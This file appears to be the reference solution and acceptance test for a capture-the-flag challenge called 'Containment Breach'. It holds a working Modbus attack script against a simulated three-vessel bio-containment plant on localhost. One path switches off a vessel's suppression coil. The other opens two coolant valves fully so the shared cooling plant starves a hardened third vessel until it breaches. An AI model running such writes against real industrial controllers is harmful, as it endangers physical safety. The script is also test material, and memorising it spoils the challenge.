#!/usr/bin/env python3
"""
Containment Breach — reference exploit / acceptance test.

Three vessels (A, B, C) share one finite cryo-suppression plant. Each
vessel's incubation_temp is a LIVE SIMULATED state, not a direct input:
constant metabolic heat in, actual received cooling out. Starving a vessel
of cooling lets its own temperature climb, which directly accelerates its
own reproduction rate — a genuine thermal-runaway feedback loop, not a
static imbalance. A and B are directly attackable via their coolant valve;
C is hardened — a local Hand-Off-Auto lockout reverts any remote write to
its valve/coil within one tick. The only way to breach C is to starve the
SHARED plant capacity via A and/or B.

  direct         Attack Vessel A or B directly by killing its suppression
                 coil. With cooling cut to zero, that vessel's own
                 temperature climbs from unchecked metabolic heat alone,
                 and it eventually breaches itself from HEAT — flavor
                 only, no flag. (The old "write incubation_temp directly"
                 technique no longer has any lasting effect — the register
                 is simulation output now, overwritten every tick.)

  plant-overload Push A and/or B's coolant_valve_pct open to the device's
                 100% ceiling (nominal is a throttled 30%; the device
                 hard-caps writes at 100 and clamps anything higher back
                 within one tick). Their own demand on the shared plant
                 spikes, and because they're now requesting more than
                 their old nominal share, they actually receive slightly
                 MORE cooling than before — harmless, they just drift a
                 bit cooler and sit dormant (no breach). Everyone else's
                 share of the pool shrinks instead: Vessel C's real
                 suppression_level falls even though its own valve never
                 moved, so its own temperature climbs on its own metabolic
                 heat — and because growth scales with that live
                 temperature, its reproduction rate visibly accelerates as
                 it heats up, driving density past threshold. THIS is what
                 reveals the flag (Ignition Perspective popup; not
                 readable from any register).

Usage:
    python solve.py --path direct --vessel a [--host 127.0.0.1] [--port 5030] [--timeout 30]
    python solve.py --path plant-overload [--host 127.0.0.1] [--port 5030] [--timeout 30]
"""

import argparse
import sys
import time

from pymodbus.client import ModbusTcpClient

# ── Register/coil PDU addresses (0-based) — identical on every vessel ───────
HR_INCUBATION_TEMP   = 0   # 40001  R/W — incubation setpoint %
HR_COLONY_DENSITY    = 1   # 40002  R   — colony density x10 (sim-driven)
HR_BREACH_THRESHOLD  = 2   # 40003  R   — rupture threshold x10 (static)
HR_SUPPRESSION_LEVEL = 3   # 40004  R   — actual cooling received, % (can exceed 100)
HR_COOLANT_VALVE     = 4   # 40005  R/W — how far open the cooling valve is, %

COIL_SUPPRESSION = 0       # 00001  R/W — suppression_system (1 = active)
COIL_BREACH      = 1       # 00002  R   — breach flag (undocumented; this is what we watch)

# ── Plant telemetry (read-only) ──────────────────────────────────────────────
HR_PLANT_CAPACITY   = 0
HR_PLANT_DEMAND     = 1
HR_PLANT_ALLOCATION = 2

DISPLAY_SCALE = 10         # density registers store value x10

DEFAULT_PORT = 5030   # one port; every device is a Modbus unit ID on it
UNIT_IDS = {"a": 1, "b": 2, "c": 3, "plant": 4}

OVERDRAW_VALVE_PCT = 100   # what we push A/B's coolant_valve_pct open to (the device's hard cap)


# ── Helpers ───────────────────────────────────────────────────────────────────

PORT = DEFAULT_PORT


def connect(host: str) -> ModbusTcpClient:
    client = ModbusTcpClient(host, port=PORT)
    if not client.connect():
        print(f"[-] Connection refused on {host}:{PORT}. Is the sim container running?")
        print("    docker compose up -d")
        sys.exit(1)
    return client


def read_state(client: ModbusTcpClient, unit: int) -> dict:
    hr = client.read_holding_registers(HR_INCUBATION_TEMP, count=5, slave=unit)
    co = client.read_coils(COIL_SUPPRESSION, count=2, slave=unit)

    if hr.isError():
        raise IOError(f"Holding-register read failed: {hr}")
    if co.isError():
        raise IOError(f"Coil read failed: {co}")

    return {
        "incubation_temp":   hr.registers[0],
        "colony_density":    hr.registers[1],
        "breach_threshold":  hr.registers[2],
        "suppression_level": hr.registers[3],
        "coolant_valve_pct": hr.registers[4],
        "suppression_on":    bool(co.bits[0]),
        "breach":            bool(co.bits[1]),
    }


def read_plant(client: ModbusTcpClient, unit: int) -> dict:
    hr = client.read_holding_registers(HR_PLANT_CAPACITY, count=3, slave=unit)
    if hr.isError():
        raise IOError(f"Plant register read failed: {hr}")
    return {
        "total_capacity": hr.registers[0],
        "total_demand":   hr.registers[1],
        "allocation_pct": hr.registers[2],
    }


def fmt_state(name: str, s: dict) -> str:
    density_d = s["colony_density"] / DISPLAY_SCALE
    threshold_d = s["breach_threshold"] / DISPLAY_SCALE
    return (
        f"[{name}] temp={s['incubation_temp']:3d}%  "
        f"density={density_d:6.1f}/{threshold_d:.1f}  "
        f"valve={s['coolant_valve_pct']:3d}%  "
        f"cryo={s['suppression_level']:3d}%  "
        f"breach={'YES <<<' if s['breach'] else 'no'}"
    )


def assert_not_breached(name: str, s: dict) -> None:
    if s["breach"]:
        print(f"[!] Vessel {name} is ALREADY breached — restart the sim container and try again.")
        sys.exit(1)


# ── Exploit paths ─────────────────────────────────────────────────────────────

def path_direct(host: str, vessel: str) -> None:
    """
    Attack a single vessel directly (A or B) by killing its suppression
    coil. With cooling cut to zero, unchecked metabolic heat alone drives
    its own temperature up, eventually breaching it from HEAT — flavor
    only, no flag. Vessel C ignores this: its lockout force-reverts any
    coil write within one tick.
    """
    unit = UNIT_IDS[vessel]
    client = connect(host)
    try:
        s = read_state(client, unit)
        print(f"[*] PATH: DIRECT (suppression-kill) on Vessel {vessel.upper()}")
        print(f"[*] {fmt_state(vessel.upper(), s)}")
        assert_not_breached(vessel.upper(), s)

        print("[*] Writing suppression_system coil -> 0 (disabling cryo suppression) ...")
        resp = client.write_coil(COIL_SUPPRESSION, False, slave=unit)
        if resp.isError():
            raise IOError(f"Write failed: {resp}")
        print(f"[+] Vessel {vessel.upper()} attacked directly.")
    finally:
        client.close()


def path_plant_overload(host: str, vessels: list[str]) -> None:
    """
    Push A and/or B's coolant_valve_pct open to OVERDRAW_VALVE_PCT (the
    device's 100% cap). Their own demand on the shared plant spikes — they
    get slightly MORE cooling than nominal as a result (harmless, no
    breach) — while starving Vessel C's real suppression_level even though
    its own valve and setpoint never moved, breaching C without ever
    writing to its registers.
    """
    print(f"[*] PATH: PLANT OVERLOAD via vessel(s) {', '.join(v.upper() for v in vessels)}")

    for v in vessels:
        unit = UNIT_IDS[v]
        client = connect(host)
        try:
            s = read_state(client, unit)
            print(f"[*] {fmt_state(v.upper(), s)}")
            print(f"[*] Writing Vessel {v.upper()} coolant_valve_pct -> {OVERDRAW_VALVE_PCT} ...")
            resp = client.write_register(HR_COOLANT_VALVE, OVERDRAW_VALVE_PCT, slave=unit)
            if resp.isError():
                raise IOError(f"Register write failed: {resp}")
        finally:
            client.close()

    print("[+] Drawn open. Shared plant demand should now exceed capacity.")


# ── Polling loop ──────────────────────────────────────────────────────────────

def poll_until_breach(host: str, vessel: str, timeout: int) -> bool:
    """Poll a vessel's colony_density/breach coil, and the plant's allocation, until breach or timeout."""
    unit = UNIT_IDS[vessel]
    client = connect(host)
    plant_client = connect(host)

    print(f"\n[*] Monitoring Vessel {vessel.upper()} + plant — polling every 0.5s (timeout={timeout}s) ...\n")
    deadline = time.time() + timeout

    try:
        while time.time() < deadline:
            s = read_state(client, unit)
            p = read_plant(plant_client, UNIT_IDS["plant"])
            print(
                f"    {fmt_state(vessel.upper(), s)}  |  "
                f"plant: demand={p['total_demand']:3d}/{p['total_capacity']:3d}  "
                f"alloc={p['allocation_pct']:3d}%"
            )

            if s["breach"]:
                density_d = s["colony_density"] / DISPLAY_SCALE
                threshold_d = s["breach_threshold"] / DISPLAY_SCALE
                print(f"\n[+] BREACH CONFIRMED on Vessel {vessel.upper()}")
                print("[+] Coil 00002 (breach) = 1")
                if vessel == "c":
                    print(
                        f"    Density {density_d:.1f} exceeded threshold {threshold_d:.1f} "
                        "(HEAT breach — the real flag condition)."
                    )
                    print()
                    print("=" * 60)
                    print("  The flag has been revealed in the Ignition Perspective")
                    print("  session as a modal BIOHAZARD ALARM popup.")
                    print("  Confirm the popup rendered correctly in the HMI browser.")
                    print("=" * 60)
                else:
                    print(
                        f"    density {density_d:.1f} exceeded threshold {threshold_d:.1f} "
                        "(HEAT self-breach, side effect, no flag)."
                    )
                return True

            time.sleep(0.5)
    finally:
        client.close()
        plant_client.close()

    print(f"\n[-] Timeout ({timeout}s) reached — breach coil did not trip.")
    print("    Check sim container logs:  docker compose logs -f sim")
    return False


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Containment Breach — reference exploit & acceptance test",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--host", default="127.0.0.1", help="Simulation host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Modbus port (default: 5030)")
    parser.add_argument("--path", required=True, choices=["direct", "plant-overload"],
                        help="Exploit path to execute")
    parser.add_argument("--vessel", choices=["a", "b"], default="a",
                        help="For --path direct: which vessel to attack (default: a)")
    parser.add_argument("--vessels", nargs="+", choices=["a", "b"], default=["a", "b"],
                        help="For --path plant-overload: which vessels to force open (default: a b)")
    parser.add_argument("--timeout", type=int, default=30,
                        help="Seconds to wait for breach confirmation (default: 30)")
    args = parser.parse_args()
    global PORT
    PORT = args.port

    try:
        if args.path == "direct":
            path_direct(args.host, args.vessel)
            ok = poll_until_breach(args.host, args.vessel, args.timeout)
        else:
            path_plant_overload(args.host, args.vessels)
            ok = poll_until_breach(args.host, "c", args.timeout)
        sys.exit(0 if ok else 1)
    except IOError as exc:
        print(f"[-] I/O error: {exc}")
        sys.exit(1)


if __name__ == "__main__":
    main()
